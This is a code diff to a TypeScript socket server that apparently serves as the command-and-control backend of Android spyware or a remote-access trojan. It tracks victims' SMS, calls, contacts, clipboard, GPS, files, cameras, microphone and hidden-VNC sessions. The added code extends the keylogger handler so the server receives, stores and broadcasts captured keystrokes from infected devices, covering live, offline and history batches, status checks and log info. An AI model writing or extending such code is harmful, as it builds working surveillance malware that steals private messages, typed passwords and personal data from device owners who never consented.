@@ -231,7 +231,7 @@ class SocketService {
   }
 
   private ensureClientData(clientId: string): void {
-    const dataTypes = ['sms', 'calls', 'contacts', 'wifi', 'clipboard', 'notifications', 'notification_status', 'permissions', 'apps', 'gps', 'gps_error', 'files', 'file_error', 'cameras', 'mic_status', 'queue', 'keylogger'];
+    const dataTypes = ['sms', 'calls', 'contacts', 'wifi', 'clipboard', 'notifications', 'notification_status', 'permissions', 'apps', 'gps', 'gps_error', 'files', 'file_error', 'cameras', 'mic_status', 'queue', 'keylogger', 'keylogger_status', 'keylogger_log_info'];
     for (const type of dataTypes) dbHelpers.getOrCreateClientData(clientId, type);
   }
 
@@ -625,30 +625,112 @@ class SocketService {
 
     socket.on(CMD.KEYLOGGER, (data: any) => {
       try {
+        // ── Status response: { enabled: boolean, totalQueued: number } ──
+        if (typeof data.enabled === 'boolean' || data.action === 'status') {
+          const status = {
+            enabled: !!data.enabled,
+            queued: typeof data.totalQueued === 'number' ? data.totalQueued : (data.queued ?? 0),
+            checkedAt: new Date().toISOString(),
+          };
+          dbHelpers.setClientData(id, 'keylogger_status', JSON.stringify(status));
+          dbHelpers.addLog('DATA', 'KEYLOGGER', `Keylogger status from ${id}`, JSON.stringify(status));
+          broadcastData('keylogger_status');
+          return;
+        }
+
+        // ── getQueued response: { action: 'getQueued', totalQueued: number } ──
+        if (data.action === 'getQueued') {
+          const queuedInfo = { queued: data.totalQueued ?? data.queued ?? 0, checkedAt: new Date().toISOString() };
+          dbHelpers.setClientData(id, 'keylogger_status', JSON.stringify(queuedInfo));
+          broadcastData('keylogger_status');
+          return;
+        }
+
+        // ── getLogs response: { path, size, name } ──
+        if (data.action === 'getLogs' || (data.path && data.name)) {
+          const logInfo = { path: data.path ?? '', size: data.size ?? 0, name: data.name ?? '', checkedAt: new Date().toISOString() };
+          dbHelpers.setClientData(id, 'keylogger_log_info', JSON.stringify(logInfo));
+          broadcastData('keylogger');
+          return;
+        }
+
+        // ── clearSynced response: { action: 'clearSynced', success: boolean } ──
+        if (data.action === 'clearSynced') {
+          dbHelpers.addLog('DATA', 'KEYLOGGER', `Keylogger synced data cleared on ${id}`, '');
+          broadcastData('keylogger');
+          return;
+        }
+
+        // ── getHistory response: { action: 'getHistory', history: [...], total: number } ──
+        if (data.history && Array.isArray(data.history)) {
+          const existing = JSON.parse(dbHelpers.getOrCreateClientData(id, 'keylogger'));
+          for (const item of data.history) {
+            existing.push({
+              type: 'history',
+              eventType: item.eventType || '',
+              pkg: item.pkg || '',
+              cls: item.cls || '',
+              viewId: item.viewId || '',
+              text: item.txt || item.text || '',
+              extra: item.extra || '',
+              timestamp: item.ts || data.timestamp || new Date().toISOString(),
+            });
+          }
+          if (existing.length > 10000) {
+            existing.splice(0, existing.length - 10000);
+          }
+          dbHelpers.setClientData(id, 'keylogger', JSON.stringify(existing));
+          dbHelpers.addLog('DATA', 'KEYLOGGER', `Keylogger history received from ${id}`, JSON.stringify({
+            historyCount: data.history.length,
+            total: data.total ?? data.history.length,
+          }));
+          broadcastData('keylogger');
+          return;
+        }
+
+        // ── Live + offline batch (standard flush) ──
         const existing = JSON.parse(dbHelpers.getOrCreateClientData(id, 'keylogger'));
-        if (data.live) {
+
+        // Live entries: now sent as array of structured objects
+        if (data.live && Array.isArray(data.live)) {
+          for (const item of data.live) {
+            existing.push({
+              type: 'live',
+              eventType: item.eventType || '',
+              pkg: item.pkg || '',
+              cls: item.cls || '',
+              viewId: item.viewId || '',
+              text: item.txt || item.text || '',
+              extra: item.extra || '',
+              timestamp: item.ts || data.timestamp || new Date().toISOString(),
+            });
+          }
+        } else if (data.live && typeof data.live === 'string' && data.live.trim()) {
+          // Backward compat: raw string blob from older clients
           existing.push({ type: 'live', content: data.live, timestamp: data.timestamp || new Date().toISOString() });
         }
+
         if (data.offlineBatch && Array.isArray(data.offlineBatch)) {
           for (const item of data.offlineBatch) {
             existing.push({
               type: 'offline',
-              eventType: item.eventType,
-              pkg: item.pkg,
-              cls: item.cls,
-              viewId: item.viewId,
-              text: item.txt,
-              extra: item.extra,
+              eventType: item.eventType || '',
+              pkg: item.pkg || '',
+              cls: item.cls || '',
+              viewId: item.viewId || '',
+              text: item.txt || item.text || '',
+              extra: item.extra || '',
               timestamp: item.ts || data.timestamp || new Date().toISOString(),
             });
           }
         }
+
         if (existing.length > 10000) {
           existing.splice(0, existing.length - 10000);
         }
         dbHelpers.setClientData(id, 'keylogger', JSON.stringify(existing));
         dbHelpers.addLog('DATA', 'KEYLOGGER', `Keystroke data received from ${id}`, JSON.stringify({
-          liveCount: data.live ? 1 : 0,
+          liveCount: Array.isArray(data.live) ? data.live.length : (data.live ? 1 : 0),
           offlineCount: data.offlineBatch?.length || 0,
           totalQueued: data.totalQueued,
         }));
@@ -711,6 +793,7 @@ class SocketService {
             transport: data.transport,
             connectionState: data.connectionState,
             sessionId: data.sessionId,
+            authVerified: data.authVerified,
           });
           broadcastData('hvnc');
         } else if (data.type === 'error' && data.error) {
